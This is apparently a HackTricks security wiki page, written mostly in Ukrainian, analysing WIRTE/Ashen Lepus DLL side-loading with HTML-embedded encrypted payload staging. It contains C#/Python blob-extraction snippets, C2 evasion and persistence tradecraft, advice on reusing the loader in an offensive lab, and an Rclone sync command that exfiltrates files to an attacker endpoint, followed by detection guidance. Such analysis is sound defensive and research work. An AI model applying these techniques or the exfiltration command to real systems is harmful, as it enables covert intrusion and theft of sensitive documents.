# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Огляд тактики

Ashen Lepus (також відома як WIRTE) застосувала повторювану схему, що поєднує DLL sideloading, HTML payloads, завантажувані поетапно, і модульні .NET backdoors для закріплення в дипломатичних мережах Близького Сходу. Цю техніку може повторити будь-який оператор, оскільки вона спирається на:<sup>[[1]](#references)</sup>

- **Соціальна інженерія на основі архівів**: у нешкідливих PDF-файлах цілі отримують інструкції завантажити RAR-архів із сайту для обміну файлами. В архіві містяться EXE-файл переглядача документів, що має справжній вигляд, шкідлива DLL із назвою довіреної бібліотеки (наприклад, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) і файл-приманка `Document.pdf`.
- **Зловживання порядком пошуку DLL**: жертва двічі клацає EXE-файл, Windows знаходить імпортовану DLL у поточному каталозі, а шкідливий loader (AshenLoader) виконується в довіреному процесі, водночас відкривається PDF-файл-приманка, щоб не викликати підозр.
- **Поетапне завантаження з використанням легітимних засобів системи**: усі наступні етапи (AshenStager → AshenOrchestrator → модулі) залишаються поза диском до потреби; їх доставляють як зашифровані blob-и, приховані у звичайних на вигляд HTML-відповідях.

## Багатоетапний ланцюжок Side-Loading

1. **EXE-файл-приманка → AshenLoader**: EXE-файл виконує side-load AshenLoader, який збирає дані про хост, шифрує їх за допомогою AES-CTR і надсилає POST-запитом у змінюваних параметрах, як-от `token=`, `id=`, `q=` або `auth=`, на шляхи, схожі на API (наприклад, `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Витягування з HTML**: C2 видає наступний етап, лише якщо геолокація IP-адреси клієнта вказує на цільовий регіон, а `User-Agent` відповідає implant, що ускладнює роботу sandbox-середовищ. Якщо перевірки пройдено, тіло HTTP-відповіді містить blob `<headerp>...</headerp>` із payload AshenStager, зашифрованим у Base64/AES-CTR.
3. **Другий sideload**: AshenStager розгортається разом з іншим легітимним binary, який імпортує `wtsapi32.dll`. Шкідлива копія, завантажена в binary, отримує додатковий HTML і цього разу виокремлює вміст між `<article>...</article>`, щоб відновити AshenOrchestrator.
4. **AshenOrchestrator**: модульний .NET controller, який декодує конфігурацію JSON у Base64. Поля `tg` і `au` з конфігурації об’єднуються та хешуються, утворюючи AES-ключ, який розшифровує `xrk`. Отримані байти слугують XOR-ключем для кожного модуля, завантаженого згодом.
5. **Доставка модулів**: кожен модуль описано в HTML-коментарях, які спрямовують parser до довільного тегу, обходячи статичні правила, що шукають лише `<headerp>` або `<article>`. Модулі охоплюють закріплення в системі (`PR*`), засоби видалення (`UN*`), розвідку (`SN`), захоплення екрана (`SCT`) і огляд файлів (`FE`).

### Схема парсингу HTML-контейнерів

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Навіть якщо захисники блокують або видаляють певний елемент, оператору потрібно лише змінити тег, на який указує HTML-коментар, щоб відновити доставку.<sup>[[1]](#references)</sup>

### Допоміжний засіб для швидкого вилучення (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Паралелі з обходом виявлення через HTML-стейджинг

Нещодавні дослідження HTML-смuggling (Talos) висвітлюють payload-и, приховані у вигляді рядків Base64 у блоках `<script>` HTML-вкладень і декодовані JavaScript під час виконання.<sup>[[2]](#references)</sup> Цей самий прийом можна повторно використати для відповідей C2: розмістити зашифровані blobs у тезі script (або іншому елементі DOM) і декодувати їх у пам’яті перед AES/XOR, завдяки чому сторінка виглядає як звичайний HTML. Talos також демонструє багатошарову обфускацію (перейменування ідентифікаторів плюс Base64/Caesar/AES) у тегах script, що добре підходить для HTML-стейджингових blobs C2.<sup>[[2]](#references)</sup> Пізніший матеріал Talos про **hidden text salting** також доречний: розділення Base64 незначущими HTML-коментарями або пробілами достатнє, щоб зламати прості regex-екстрактори, водночас браузеру залишається легко відновити початковий вміст.<sup>[[7]](#references)</sup>

## Нотатки про нещодавні варіанти (2024-2025)

- Check Point зафіксувала кампанії WIRTE у 2024 році, які й надалі спиралися на sideloading із використанням архівів, але застосовували `propsys.dll` (stagerx64) як перший етап. Stager декодує наступний payload за допомогою Base64 + XOR (ключ `53`), надсилає HTTP-запити з жорстко заданим `User-Agent` і витягує зашифровані blobs, вбудовані між HTML-тегами. В одній гілці stage відновлювався з довгого списку вбудованих IP-рядків, декодованих за допомогою `RtlIpv4StringToAddressA`, після чого вони конкатенувалися у байти payload-а.<sup>[[3]](#references)</sup>
- OWN-CERT задокументувала давніші інструменти WIRTE, у яких sideloaded `wtsapi32.dll` dropper захищав рядки за допомогою Base64 + TEA і використовував саму назву DLL як ключ дешифрування, а потім обфускував дані ідентифікації хоста за допомогою XOR/Base64 перед надсиланням до C2.<sup>[[4]](#references)</sup>

## Відновлення IP-кодованих етапів

Гілка WIRTE з `propsys.dll` за 2024 рік демонструє, що наступний PE не обов’язково має міститися в одному суцільному HTML-блоці. Loader може зберігати байти stage у вигляді рядків із dotted-quad IP-адресами та відновлювати їх за допомогою `RtlIpv4StringToAddressA` — цей метод тісно пов’язаний із tradecraft **IPfuscation** угруповання Hive.<sup>[[3]](#references)[[5]](#references)</sup> На практиці це корисно, коли зловмисник хоче, щоб HTML-сторінка містила те, що схоже на нешкідливі IOC або дані конфігурації, а не очевидний payload Base64.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Якщо відновлені байти починаються з `MZ`, імовірно, ви безпосередньо відновили наступний PE. Якщо ні, перевірте, чи немає на початку шару XOR/Base64 або невеликих роздільників між адресами.

## Змінні назви DLL і ротація хостів

Важлива особливість цього шаблону: **HTML/AES/XOR-бекенд для staging може залишатися незмінним, тоді як змінюється лише пара для sideloading**. У різних кампаніях WIRTE використовували `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` і `propsys.dll`. Це корисно, оскільки:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` і `wtsapi32.dll` — звичайні назви DLL Windows, які захисники очікують побачити в `%System32%` / `%SysWOW64%`.
- Публічні каталоги, як-от **HijackLibs**, уже містять мапінг багатьох бінарних файлів, які завантажують ці DLL з копій каталогу програми. Це дає операторам змогу замінювати хости без перепроєктування stager.
- Для кожного хоста потрібно адаптувати лише набір експортованих функцій. HTML-парсер, процедури AES/XOR і завантажувач модулів зазвичай можна без змін перенести до DLL-проксі з forwarding.

Для роботи в offensive-лабораторії це означає, що завдання можна розділити на **(1) пошук стабільного підписаного хоста, який локально розв’язує вибрану назву DLL, і (2) повторне використання тієї самої логіки завантаження staged-HTML за цією DLL**.

## Посилення криптографії та C2

- **AES-CTR усюди**: сучасні завантажувачі містять ключі довжиною 256 біт і nonce (наприклад, `{9a 20 51 98 ...}`), а також можуть додатково використовувати шар XOR із рядками на кшталт `msasn1.dll` до або після розшифрування.<sup>[[1]](#references)</sup>
- **Варіації ключового матеріалу**: у ранніх завантажувачах для захисту вбудованих рядків використовували Base64 + TEA, а ключ для розшифрування виводили з назви шкідливої DLL (наприклад, `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Розділення інфраструктури та маскування піддоменів**: staging-сервери розподілені між інструментами, розміщені в різних ASN і часом працюють через піддомени, що виглядають легітимно. Тому викриття одного етапу не розкриває решту.
- **Приховування розвідданих**: перелічені дані тепер містять списки Program Files для виявлення цінних програм, а перед надсиланням із хоста завжди шифруються.
- **Ротація URI**: параметри запитів і REST-шляхи змінюються між кампаніями (`/api/v1/account?token=` → `/api/v2/account?auth=`), що робить нестійкими детектори, прив’язані до конкретних шаблонів.
- **Фіксація User-Agent і безпечні перенаправлення**: інфраструктура C2 відповідає лише на точні рядки UA, а в інших випадках перенаправляє на безпечні новинні чи медичні сайти, щоб не вирізнятися.
- **Контрольована доставка**: сервери обмежені за геолокацією та відповідають лише справжнім імплантам. Неавторизовані клієнти отримують HTML без підозрілих ознак.

## Persistence і цикл виконання

AshenStager створює заплановані завдання, що маскуються під завдання обслуговування Windows і виконуються через `svchost.exe`, наприклад:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ці завдання повторно запускають ланцюжок sideloading під час завантаження системи або через задані інтервали. Це дає AshenOrchestrator змогу запитувати нові модулі без повторного запису на диск.

## Використання легітимних клієнтів синхронізації для ексфільтрації

Оператори за допомогою спеціального модуля розміщують дипломатичні документи в `C:\Users\Public` (доступному для читання всім і не підозрілому), а потім завантажують легітимний бінарний файл [Rclone](https://rclone.org/), щоб синхронізувати цей каталог зі сховищем зловмисника. За даними Unit42, це перший зафіксований випадок використання цим актором Rclone для ексфільтрації; це відповідає ширшій тенденції зловживання легітимними інструментами синхронізації для маскування під звичайний трафік:<sup>[[1]](#references)</sup>

1. **Підготовка**: скопіювати або зібрати цільові файли в `C:\Users\Public\{campaign}\`.
2. **Налаштування**: передати конфігурацію Rclone з адресою контрольованої зловмисником кінцевої точки HTTPS (наприклад, `api.technology-system[.]com`).
3. **Синхронізація**: запустити `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, щоб трафік був схожий на звичайне резервне копіювання в хмару.

Оскільки Rclone широко використовують для легітимного резервного копіювання, захисникам слід зосередитися на аномальних запусках (нові бінарні файли, незвичні remotes або раптова синхронізація вмісту `C:\Users\Public`).

## Напрями виявлення

- Створюйте сповіщення про **підписані процеси**, які неочікувано завантажують DLL із шляхів, доступних для запису користувачам (фільтри Procmon + `Get-ProcessMitigation -Module`), особливо якщо назви DLL містять `netutils`, `srvcli`, `dwampi`, `wtsapi32` або `propsys`.<sup>[[6]](#references)</sup>
- Перевіряйте підозрілі HTTPS-відповіді на наявність **великих Base64-блоків у незвичних тегах** або коментарів `<!-- TAG: <xyz> -->`, що їх приховують.
- Спершу нормалізуйте HTML: **видаляйте коментарі та згортуйте пробіли перед вилученням Base64**, оскільки ухилення з використанням прихованого тексту для засолювання може розділяти payload між коментарями.
- Розширте пошук в HTML на **рядки Base64 усередині блоків `<script>`** (staging у стилі HTML smuggling), які декодуються через JavaScript перед обробкою AES/XOR.
- Шукайте повторні виклики **`RtlIpv4StringToAddressA` із подальшим збиранням буфера**, особливо якщо навколишні рядки — це довгі списки IPv4-адрес, а не справжні мережеві цілі.
- Шукайте **заплановані завдання**, які запускають `svchost.exe` з аргументами, не пов’язаними зі службами, або вказують на каталоги dropper.
- Відстежуйте **перенаправлення C2**, які повертають payload лише для точних рядків `User-Agent`, а в інших випадках перенаправляють на легітимні новинні чи медичні домени.
- Стежте за появою бінарних файлів **Rclone** поза розташуваннями, якими керує IT, нових файлів `rclone.conf` або завдань синхронізації з каталогів staging на кшталт `C:\Users\Public`.
